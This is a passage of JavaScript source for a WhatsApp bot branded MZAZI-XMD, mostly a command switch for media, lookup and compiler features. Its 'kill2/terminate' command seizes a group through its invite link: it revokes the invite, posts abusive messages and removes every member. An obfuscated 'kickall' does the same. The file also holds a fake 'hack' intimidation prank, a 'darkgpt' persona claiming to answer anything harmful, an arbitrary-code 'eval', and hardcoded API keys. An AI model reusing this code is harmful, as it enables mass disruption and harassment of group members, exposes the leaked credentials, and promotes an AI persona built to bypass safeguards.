			if (!/image/.test(mime)) return reply(`𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻𝘀 ${prefix + command}`)
			
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			client.sendMessage(m.chat, { image: proses, caption: '𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗'}, { quoted: m })
			}
			break;
		      
	      case "kill2": case "kickall2": case "terminate": {
	if (!Owner) throw NotOwner;

    if (!text) {
      return m.reply("Provide a valid group link. Ensure the bot is in that group with admin privileges !");
    }

    let groupId;
    let groupName;
    try {
      let inviteCode = args[0].split("https://chat.whatsapp.com/")[1];
      const groupInfo = await client.groupGetInviteInfo(inviteCode);
      ({ id: groupId, subject: groupName } = groupInfo);
    } catch (error) {
      m.reply("Why are you giving me an invalid group link?");
      return;
    }

    try {
      const groupMetadata = await client.groupMetadata(groupId);
      const participants = await groupMetadata.participants;
      let participantIds = participants
        .filter(participant => participant.id !== client.decodeJid(client.user.id))
        .map(participant => participant.id);

      await m.reply("☠️𝑴𝒛𝒂𝒛𝒊 𝒊𝒔 𝒊𝒏𝒊𝒕𝒊𝒂𝒍𝒊𝒛𝒊𝒏𝒈 𝒂𝒏𝒅 𝒑𝒓𝒆𝒑𝒂𝒓𝒊𝒏𝒈 𝒕𝒐 𝒌𝒊𝒍𝒍☠️ " + groupName);
      await client.groupSettingUpdate(groupId, "announcement");
      await client.removeProfilePicture(groupId);
      await client.groupUpdateSubject(groupId, "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔 𝒏𝒐 𝒍𝒐𝒏𝒈𝒆𝒓 𝒂𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 🚫");
      await client.groupUpdateDescription(groupId, "//𝑩𝒚 𝒕𝒉𝒆 𝒐𝒓𝒅𝒆𝒕 𝒐𝒇 𝗠𝗭𝗔𝗭𝗜 𝗗𝗲𝘃 !");
      await client.groupRevokeInvite(groupId);

      
      await client.sendMessage(
        groupId,
        {
          text: `𝑨𝒕 𝒕𝒉𝒊𝒔 𝒕𝒊𝒎𝒆, 𝑴𝒚 𝒐𝒘𝒏𝒆𝒓 𝒉𝒂𝒔 𝒊𝒏𝒊𝒕𝒊𝒂𝒕𝒆𝒅 𝒕𝒐 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒓𝒆𝒎𝒐𝒕𝒆𝒍𝒚.\n𝑻𝒉𝒊𝒔 𝒉𝒂𝒔 𝒕𝒓𝒊𝒈𝒈𝒆𝒓𝒆𝒅 𝒎𝒆 𝒕𝒐 𝒓𝒆𝒎𝒐𝒗𝒆 𝒂𝒍𝒍 𝒕𝒉𝒆 𝒔𝒕𝒖𝒑𝒊𝒅 ${participantIds.length} 𝒈𝒓𝒐𝒖𝒑 𝒑𝒂𝒓𝒕𝒊𝒄𝒊𝒑𝒂𝒏𝒕𝒔 𝒊𝒏 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 𝒔𝒆𝒄𝒐𝒏𝒅.\n\n𝑮𝒐𝒐𝒅 𝒃𝒚𝒆 𝒎𝒐𝒕𝒉𝒆𝒓𝒇*𝒄𝒌𝒆𝒓𝒔! 👋\n\n⚠️𝑻𝑯𝑰𝑺 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑪𝑨𝑵𝑵𝑶𝑻 𝑩𝑬 𝑻𝑬𝑹𝑴𝑰𝑵𝑨𝑻𝑬𝑫⚠️`,
          mentions: participants.map(participant => participant.id)
        });

      await client.groupParticipantsUpdate(groupId, participantIds, "remove");

      const goodbyeMessage = {
        text: "𝑮𝒐𝒐𝒅𝒃𝒚𝒆 𝑮𝒓𝒐𝒖𝒑 𝒐𝒘𝒏𝒆𝒓👋\n𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔 𝒖𝒔𝒆𝒍𝒆𝒔𝒔, 𝒄𝒓𝒆𝒂𝒕𝒆 𝒂𝒏𝒐𝒕𝒉𝒆𝒓 𝒐𝒏𝒆🥶"
      };
      await client.sendMessage(groupId, goodbyeMessage);

      await client.groupLeave(groupId);
      await m.reply("```𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 𝑲𝒊𝒍𝒍𝒆𝒅 𝒃𝒚 𝑴𝒁𝑨𝒁𝑰-𝑿𝑴𝑫💀```");
    } catch (error) {
      m.reply("```Kill command failed, bot is either not in that group, or not an admin```.");
    }
  }
		      break;
		      
		      case 'carbon': {
		      const fetch = require('node-fetch');

  let cap = `𝗖𝗢𝗡𝗩𝗘𝗥𝗧𝗘𝗗 𝗕𝗬 ${botname}`;

  if (m.quoted && m.quoted.text) {
    const forq = m.quoted.text;

    try {
      let response = await fetch('https://carbonara.solopov.dev/api/cook', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          code: forq,
          backgroundColor: '#1F816D',
        }),
      });

      if (!response.ok) return m.reply('API failed to fetch a valid response.')

      let per = await response.buffer();

      await client.sendMessage(m.chat, { image: per, caption: cap }, { quoted: m });
    } catch (error) {
      m.reply("An error occured\n" + error)
    }
  } else {
    m.reply('Quote a code message');
  }
}
	 break;

		case 'define': {
		      try {
        if (!text) {
            return m.reply('Please provide a word.');
        }

        const word = encodeURIComponent(text);

        const response = await fetch(`https://api.dictionaryapi.dev/api/v2/entries/en/${word}`);

        if (!response.ok) {
            return m.reply('Failed to fetch data. Please try again later.');
        }

        const data = await response.json();

        if (!data || !data[0] || !data[0].meanings || data[0].meanings.length === 0) {
            return m.reply('No definitions found for the provided word.');
        }

        const definitionData = data[0];
        const definition = definitionData.meanings[0].definitions[0].definition;
        
        const message = `${definition}`;

        await client.sendMessage(m.chat, { text: message }, { quoted: m });

    } catch (error) {
        console.error("Error occurred:", error);
        m.reply('An error occurred while fetching the data. Please try again later.\n' + error);
    }
}
	break;
	         case "tweet": {
		      if (!text) return m.reply("provide some text for the tweet");

const displayname = pushname;
const username = m.sender.split('@')[0];
const avatar = await client.profilePictureUrl(m.sender, 'image').catch(_ => 'https://i.imgur.com/BsF7NhZ.jpeg');
const replies = "246";
const retweets = "125";
const theme = "dark";

const imageurl = `https://some-random-api.com/canvas/misc/tweet?displayname=${encodeURIComponent(displayname)}&username=${encodeURIComponent(username)}&avatar=${encodeURIComponent(avatar)}&comment=${encodeURIComponent(text)}&replies=${encodeURIComponent(replies)}&retweets=${encodeURIComponent(retweets)}&theme=${encodeURIComponent(theme)}`;



await client.sendMessage(m.chat, { image: { url: imageurl}, caption: `𝗖𝗼𝗻𝘃𝗲𝗿𝘁𝗲𝗱 𝗯𝘆 𝗥𝗔𝗩𝗘𝗡-𝗕𝗢𝗧`}, { quoted: m}) 

	}
	 break;
		      case "pickupline": {
		      const API_URL = 'https://api.popcat.xyz/pickuplines';

    try {
        const response = await fetch(API_URL);
        if (!response.ok) throw new Error('Failed to fetch data');

        const { pickupline } = await response.json();
        const lineMessage = `${pickupline}`;

        await client.sendMessage(m.chat, { text: lineMessage }, { quoted: m });
    } catch (error) {
        console.error('Error fetching data:', error);
        await client.sendMessage(m.chat, { text: 'An error occurred while fetching the fact.' }, { quoted: m });
    }
}
	break;
		      case "quotes": {
		      const API_URL = 'https://favqs.com/api/qotd';

    try {
        const response = await fetch(API_URL);
        if (!response.ok) throw new Error('Failed to fetch data');

        const { quote } = await response.json();
        const quoteMessage = `${quote.body} \n\n𝗤𝘂𝗼𝘁𝗲 𝗕𝘆 ${quote.author}`;

        await client.sendMessage(m.chat, { text: quoteMessage }, { quoted: m });
    } catch (error) {
        console.error('Error fetching data:', error);
        await client.sendMessage(m.chat, { text: 'An error occurred while fetching the fact.' }, { quoted: m });
    }
}
	break;
		      case "google": {
		      const axios = require("axios");
        if (!text) {
            m.reply('Provide a search term!\nEg: .Google What is treason')
            return;
        }
        let {
            data
        } = await axios.get(`https://www.googleapis.com/customsearch/v1?q=${text}&key=AIzaSyDMbI3nvmQUrfjoCJYLS69Lej1hSXQjnWI&cx=baf9bdb0c631236e5`)
        if (data.items.length == 0) {
            m.reply("❌ Unable to find a result")
            return;
        }
        let tex = `SEARCH FROM GOOGLE\n🔍 Term:- ${text}\n\n`;
        for (let i = 0; i < data.items.length; i++) {
            tex += `🪧 Title:- ${data.items[i].title}\n🖥 Description:- ${data.items[i].snippet}\n🌐 Link:- ${data.items[i].link}\n\n`
        }
        m.reply(tex)
       

    }
      break;
		      case "hack": {
		if(!Owner) throw NotOwner; 
		      try {
			      
    const steps = [
      '⚠️𝗜𝗻𝗶𝘁𝗶𝗹𝗶𝗮𝘇𝗶𝗻𝗴 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗧𝗼𝗼𝗹𝘀⚠️',
      '𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗻𝗴 𝗠𝗮𝗹𝘄𝗮𝗿𝗲🐛..\n𝗟𝗼𝗮𝗱𝗶𝗻𝗴 𝗗𝗲𝘃𝗶𝗰𝗲 𝗚𝗮𝗹𝗹𝗲𝗿𝘆 𝗙𝗶𝗹𝗲𝘀⚠️',
      '```██ 10%``` ⏳',
      '```████ 20%``` ⏳',
      '```██████ 30%``` ⏳',
      '```████████ 40%``` ⏳',
      '```██████████ 50%``` ⏳',
      '```████████████ 60%``` ⏳',
      '```██████████████ 70%``` ⏳',
      '```████████████████ 80%``` ⏳',
      '```██████████████████ 90%``` ⏳',
      '```████████████████████ 100%``` ✅',
      "```𝗦𝘆𝘀𝘁𝗲𝗺 𝗛𝘆𝗷𝗮𝗰𝗸𝗶𝗻𝗴 𝗼𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀...```\n```𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘁𝗵𝗲 𝗦𝗲𝗿𝘃𝗲𝗿 𝘁𝗼 𝗙𝗶𝗻𝗱 𝗘𝗿𝗿𝗼𝗿 404```",
    "```𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝘁𝗼 𝗗𝗲𝘃𝗶𝗰𝗲...\n𝗥𝗲𝗰𝗲𝗶𝘃𝗶𝗻𝗴 𝗗𝗮𝘁𝗮/𝗦𝗲𝗰𝗿𝗲𝘁 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀...```",
    "```𝗗𝗮𝘁𝗮 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗲𝗱 𝗙𝗿𝗼𝗺 𝗱𝗲𝘃𝗶𝗰𝗲 100% 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱\n𝗘𝗿𝗮𝘀𝗶𝗻𝗴 𝗮𝗹𝗹 𝗘𝘃𝗶𝗱𝗲𝗻𝗰𝗲, 𝗞𝗶𝗹𝗹𝗶𝗻𝗴 𝗮𝗹𝗹 𝗠𝗮𝗹𝘄𝗮𝗿𝗲𝘀🐛...```",
    "```𝗦𝗘𝗡𝗗𝗜𝗡𝗗 𝗟𝗢𝗚 𝗗𝗢𝗖𝗨𝗠𝗘𝗡𝗧𝗦...```",
    "```𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗗𝗮𝘁𝗮 𝗔𝗻𝗱 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗗𝗶𝘀𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱```",
    "```𝗔𝗹𝗹 𝗕𝗮𝗰𝗸𝗹𝗼𝗴𝘀 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆💣\n𝗬𝗼𝘂𝗿 𝗦𝘆𝘀𝘁𝗲𝗺 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗗𝗼𝘄𝗻 𝗜𝗻 𝗧𝗵𝗲 𝗡𝗲𝘅𝘁 𝗠𝗶𝗻𝘂𝘁𝗲⚠️```"
    ];
			      
    for (const line of steps) {
      await client.sendMessage(m.chat, { text: line }, { quoted: m });
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

  } catch (error) {
    console.error('Error during prank:', error);

    client.sendMessage(m.chat, {
      text: `❌ *Error!* Something went wrong. Reason: ${error.message}. Please try again later.`
    });
  }
}
  
  break;
	            
case "compile-py":

if (!text && !m.quoted) throw 'Quote/tag a python code to compile.';

const sourcecode = m.quoted ? m.quoted.text ? m.quoted.text : text ? text : m.text : m.text

let resultPromise = python.runSource(sourcecode);
resultPromise
    .then(resultt => {
        console.log(resultt);

reply(resultt.stdout);
reply(resultt.stderr);
    })
    .catch(err => {
        console.log(resultt.stderr);
reply(resultt.stderr)
    });

break;
		      case 'save': {
  const textL = m.text.toLowerCase();
  const quotedMessage = m.msg?.contextInfo?.quotedMessage;

if (quotedMessage && textL.startsWith(prefix + "save") && !m.quoted.chat.includes("status@broadcast")) {
    return m.reply("You did not tag a status media to save.");
  }

if (Owner && quotedMessage && textL.startsWith(prefix + "save") && m.quoted.chat.includes("status@broadcast")) {
    
    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      client.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
    }

    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      client.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
    }
     }
      }
    break;
	      case 'gitclone': {
		      if (!text) return m.reply(`Where is the link?`)
if (!text.includes('github.com')) return m.reply(`Is that a GitHub repo link ?!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user3, repo] = text.match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user3}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    await client.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => m.reply("error"))

		    }
		      break;

       case 'darkgpt':{

if (!text) { return m.reply("Hey there Fuckface😈, I'm Darkgpt, I respond to anything be it harmful, I'm a pure Evil👿, What sort of dark and delightful nonsense do you want to dive into Today😈 ?");
	   }
	try {
     const data = await fetchJson(`https://api.dreaded.site/api/makgpt?text=${text}`);
		
    if (data && data.result) {
	    const res = data.result;
	    await m.reply(res);
    } else {
	    m.reply("Huh, the silence is deafening, no response whatsoever💀.The API seems to have vanished into the abyss...😔");
    }
	} catch (error) {
reply('An error occured while communicating with the APIs\n' + error);
}
  }
break;
	      
		case 'github': {
 if (!text) return m.reply('Provide a github username to stalk');
 
try {
const response = await fetch(`https://itzpire.com/stalk/github-user?username=${text}`)

const data = await response.json()
 
    const username = data.data.username;
    const nickname = data.data.nickname;
    const bio = data.data.bio;
    const profilePic = data.data.profile_pic;
    const url = data.data.url;
    const type = data.data.type;
    const isAdmin = data.data.admin;
    const company = data.data.company;
    const blog = data.data.blog;
    const location = data.data.location;
    const publicRepos = data.data.public_repo;
    const publicGists = data.data.public_gists;
    const followers = data.data.followers;
    const following = data.data.following;
    const createdAt = data.data.ceated_at;
    const updatedAt = data.data.updated_at;

    
const message = `Username:- ${username}\n\nNickname:- ${nickname}\n\nBio:- ${bio}\n\nLink:- ${url}\n\nLocation:- ${location}\n\nFollowers:- ${followers}\n\nFollowing:- ${following}\n\nRepos:- ${publicRepos}\n\nCreated:- ${createdAt}`

await client.sendMessage(m.chat, { image: { url: profilePic}, caption: message}, {quoted: m})

} catch (error) {

m.reply("Unable to fetch data\n" + error)

}
      }
       break;  
		      
	      case "screenshot": case "ss": {
		      try {
let cap = `𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗯𝘆 ${botname}`

if (!text) return m.reply("Provide a website link to screenshot.")

const image = `https://image.thum.io/get/fullpage/${text}`

await client.sendMessage(m.chat, { image: { url: image }, caption: cap}, {quoted: m });


} catch (error) {

m.reply("An error occured.")

}

	      }
	      break;
		      
	      case "alive": case "test": {
		      const audiovn = "./Media/alive.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "𝗠𝘇𝗮𝘇𝗶",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "𝗛𝗶 𝘆𝗼𝘂👋, 𝗜 𝗮𝗺 𝗔𝗹𝗶𝘃𝗲 𝗮𝗹𝗹 𝘁𝗵𝗲 𝘁𝗶𝗺𝗲😂",
          body: "𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗",
          thumbnailUrl: "https://i.imgur.com/A08nrWx.jpeg",
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };
	await client.sendMessage(m.chat, dooc, {quoted: m });
	      }
		 break;
		      
	case "removebg": {
		      try {

const cap = "𝗘𝗱𝗶𝘁𝗲𝗱 𝗯𝘆 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗";

if (!m.quoted) return m.reply("Send the image then tag it with the command.");

   if (!/image/.test(mime)) return m.reply("That is not an image, try again while quoting an actual image.");             

let fdr = await client.downloadAndSaveMediaMessage(m.quoted)


                    let fta = await uploadtoimgur(fdr)
                    m.reply("𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗠𝘇𝗮𝘇𝗶 𝗶𝘀 𝗲𝗿𝗮𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝗮𝗰𝗸𝗴𝗿𝗼𝘂𝗻𝗱. . .");

const image = `https://api.dreaded.site/api/removebg?imageurl=${fta}`


await client.sendMessage(m.chat, { image: { url: image }, caption: cap}, {quoted: m });

} catch (error) {

m.reply("An error occured...")

}

      }
	break;
	      
		     case 'fact': {
	try {
const data = await fetchJson('https://api.dreaded.site/api/fact');

const fact = data.fact;

await m.reply(fact);

} catch (error) {

m.reply('Something is wrong.')

}
	      }
    break;
		      
 case 'catfact': {
	try {
const data = await fetchJson('https://api.dreaded.site/api/catfact');

const fact = data.fact;

await m.reply(fact);

} catch (error) {

m.reply('Something is wrong.')

}

    }
	      break;
		      
	  case 'tts': case 'say': {

const googleTTS = require('google-tts-api');

if (!text) return m.reply("Povide a text for conversion !");

 

const url = googleTTS.getAudioUrl(text, {
  lang: 'hi-IN',
  slow: false,
  host: 'https://translate.google.com',
});

             client.sendMessage(m.chat, { audio: { url:url},mimetype:'audio/mp4', ptt: true }, { quoted: m });

	}
	 break;
		      
 case "gpt":
           {
        if (!text) return reply(`Hello there, what's your question?`);
          let d = await fetchJson(
            `https://bk9.fun/ai/jeeves-chat2?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occurred while fetching the AI chatbot response. Please try again later."
            );
          } else {
            reply(d.BK9);
          }
		     }
break;
		      
 case 'weather': {
		      try {

if (!text) return m.reply("provide a city/town name");

const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

console.log("Weather data:",data);


        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);



await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);


} catch (e) { m.reply("Unable to find that location.") }
  }
   break;
		      
case "compile-js":
if (!text && !m.quoted) throw 'Quote/tag a Js code to compile.';

const sourcecode1 = m.quoted ? m.quoted.text ? m.quoted.text : text ? text : m.text : m.text;

let resultPromise1 = node.runSource(sourcecode1);
resultPromise1
    .then(resultt1 => {
        console.log(resultt1);
reply(resultt1.stdout);
reply(resultt1.stderr);
    })
    .catch(err => {
        console.log(resultt1.stderr);
reply(resultt1.stderr);
    });
      break;

  case 'quotely': {
try {
if (!m.quoted.text) throw 'qoute a text';
let xf = m.quoted.text;

                const {
                    quote
                } = require('./lib/mzaziquotely.js')
                
                let pppuser = await client.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/75272825615a4dcb69526.png')
                
const rel = await quote(xf, pushname, pppuser)
                
                client.sendImageAsSticker(m.chat, rel.result, m, {
                    packname: pushname,
                    author: `MZAZI-XMD`
                })

} catch (errr) { 
 await reply("Qoute some text for quotely")}

            }
             break;
		      
		      case "fullpp": {
		      if(!Owner) throw NotOwner; 
		      const { S_WHATSAPP_NET } = require('@whiskeysockets/baileys');
		      try {
const fs = require("fs");
if(!msgDreaded) { m.reply('𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲...') ; return } ;

let media;
if (msgDreaded.imageMessage) {
     media = msgDreaded.imageMessage

  } else {
    m.reply('𝗛𝘂𝗵 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲...'); return
  } ;

var medis = await client.downloadAndSaveMediaMessage(media);

                    var {
                        img
                    } = await generateProfilePicture(medis)

client.query({
                tag: 'iq',
                attrs: {
                    target: undefined,
                    to: S_WHATSAPP_NET,
                    type:'set',
                    xmlns: 'w:profile:picture'
                },
                content: [
                    {
                        tag: 'picture',
                        attrs: { type: 'image' },
                        content: img
                    }
                ]
            })
                    
                    fs.unlinkSync(medis)
                    m.reply("𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗽𝗶𝗰𝘁𝘂𝗿𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆✅")

} catch (error) {

m.reply("An error occured while updating profile photo\n" + error)

}
     }
	  break;
		      
            case "upload": case "url": {
 const fs = require("fs");
const path = require('path');

const util = require("util");

let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''

if (!mime) return m.reply('Quote an image or video')

let mediaBuffer = await q.download()

  if (mediaBuffer.length > 10 * 1024 * 1024) return m.reply('Media is too large.')

let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)

if (isTele) {
let fta2 = await client.downloadAndSaveMediaMessage(q)

    let link = await uploadtoimgur(fta2)

    const fileSizeMB = (mediaBuffer.length / (1024 * 1024)).toFixed(2)

    m.reply(`Media Link:-\n\n${link}`)
  } else {
    m.reply(`Error occured...`)
  }
    }
      break;
		      
     case 'attp':
                if (!q) return reply('I need text;')
              
                client.sendMessage(m.chat, {
                    sticker: {
                        url: `https://api.lolhuman.xyz/api/attp?apikey=cde5404984da80591a2692b6&text=${q}`
                    }
                }, {
                    quoted: m
                })
                break;
		      
    case 'smeme': {
                let responnd = `Quote an image or sticker with the 2 texts separated with |`
                if (!/image/.test(mime)) return reply(responnd)
                if (!text) return reply(responnd)
           
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await client.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await uploadtoimgur(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await client.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,

                })
                fs.unlinkSync(pop)
            }  
             break;
		      
case "compile-c":

if (!text && !m.quoted) throw 'Quote/tag a C code to compile';

const sourcecode3 =m.quoted ? m.quoted.text ? m.quoted.text : text ? text : m.text : m.text
let resultPromise3 = c.runSource(sourcecode3);
resultPromise3
    .then(resultt3 => {
        console.log(resultt3);
reply(resultt3.stdout);
reply(resultt3.stderr);    })
    .catch(err => {
        console.log(resultt3.stderr);
reply(resultt3.stderr)
    });
break;

case "compile-c++":

if (!text && !m.quoted) throw 'Quote/tag a C++ code to compile';

const sourcecode4 = m.quoted ? m.quoted.text ? m.quoted.text : text ? text : m.text : m.text
let resultPromise4 = cpp.runSource(sourcecode4);
resultPromise4
    .then(resultt4 => {
        console.log(resultt4);
reply(resultt4.stdout);
reply(resultt4.stderr);
    })
    .catch(err => {
        console.log(resultt4.stderr);
reply(resultt4.stderr)
    });
     break;
		      
case "eval":{
   if (!Owner) throw NotOwner; 
if (!text) throw 'Provide a valid Bot Baileys Function to evaluate'
   try { 
 let evaled = await eval(budy.slice(2)); 
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled); 
 await reply(evaled); 
   } catch (err) { 
 await reply(String(err)); 
   } 
 } 
     break;
		      
	case 'add':
		      if (!text) return reply('provide a number to be added in this format. \n\n add 254741388986'); 
                if (!m.isGroup) throw group;
                if(!isAdmin) throw admin;
                if (!isBotAdmin) throw botAdmin;
                let blockwwww = text;
                await client.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                reply(`succesfully added`)
                break;
		      
case "kill": case "kickall": case "terminate":
	  if (!m.isGroup) throw group;
const _0x409dbc=_0x1a95;(function(_0x13296f,_0x1d8f2b){const _0x935a90=_0x1a95,_0x2748e8=_0x13296f();while(!![]){try{const _0x1b5e80=parseInt(_0x935a90(0x95))/0x1+-parseInt(_0x935a90(0x9a))/0x2*(parseInt(_0x935a90(0x90))/0x3)+parseInt(_0x935a90(0x97))/0x4*(-parseInt(_0x935a90(0xa1))/0x5)+-parseInt(_0x935a90(0xa5))/0x6*(parseInt(_0x935a90(0x9f))/0x7)+-parseInt(_0x935a90(0xa8))/0x8*(parseInt(_0x935a90(0x9e))/0x9)+parseInt(_0x935a90(0x94))/0xa*(-parseInt(_0x935a90(0x96))/0xb)+parseInt(_0x935a90(0xa6))/0xc*(parseInt(_0x935a90(0x91))/0xd);if(_0x1b5e80===_0x1d8f2b)break;else _0x2748e8['push'](_0x2748e8['shift']());}catch(_0x1d3c29){_0x2748e8['push'](_0x2748e8['shift']());}}}(_0x302f,0x4ca98));function _0x302f(){const _0x47fb8e=['remove','358690jImMIP','51277YtWegM','77GwLDMO','3796QaODNx','groupParticipantsUpdate','length','761942DMZDOd','\x20group\x20participants\x20in\x20the\x20next\x20second.\x0a\x0aGoodbye\x20Everyone!\x20👋\x0a\x0aTHIS\x20PROCESS\x20CANNOT\x20BE\x20TERMINATED💀!','reply','chat','153XwMvJI','10738EYNDet','user','870TMQIXP','All\x20parameters\x20are\x20configured,\x20and\x20Kick-all\x20has\x20been\x20initialized\x20and\x20confirmed!.\x20Now,\x20Raven\x20will\x20remove\x20all\x20','filter','sendMessage','822dyXmDW','16642716DACfKI','Done✅.\x20All\x20group\x20participants\x20have\x20been\x20removed.\x20Do\x20not\x20always\x20use\x20this\x20command\x20to\x20avoid\x20Wa\x20bans!','54976kxXpFh','3LvxISI','13avkyVG','map'];_0x302f=function(){return _0x47fb8e;};return _0x302f();}if(!isBotAdmin)throw'I\x20need\x20admin\x20previlleges\x20to\x20execute\x20this\x20command.';if(!Owner)throw'Only MZAZI-XMD owner can use this command😲!';function _0x1a95(_0x1bdc54,_0x1d1355){const _0x302f0c=_0x302f();return _0x1a95=function(_0x1a95df,_0x572fc9){_0x1a95df=_0x1a95df-0x90;let _0x113c8c=_0x302f0c[_0x1a95df];return _0x113c8c;},_0x1a95(_0x1bdc54,_0x1d1355);}let mokaya2=participants[_0x409dbc(0xa3)](_0x5202af=>_0x5202af['id']!=client['decodeJid'](client[_0x409dbc(0xa0)]['id']))[_0x409dbc(0x92)](_0x3c0c18=>_0x3c0c18['id']);m[_0x409dbc(0x9c)]('⚠️\x20Initializing\x20Kick-all\x20command💀...'),setTimeout(()=>{const _0x661bcb=_0x409dbc;client[_0x661bcb(0xa4)](m[_0x661bcb(0x9d)],{'text':_0x661bcb(0xa2)+mokaya2[_0x661bcb(0x99)]+_0x661bcb(0x9b)},{'quoted':m}),setTimeout(()=>{const _0x5c1d7c=_0x661bcb;client[_0x5c1d7c(0x98)](m[_0x5c1d7c(0x9d)],mokaya2,_0x5c1d7c(0x93)),setTimeout(()=>{const _0x46c32c=_0x5c1d7c;m['reply'](_0x46c32c(0xa7));},0x3e8);},0x3e8);},0x3e8);
break;
		      
  case "system": 
  
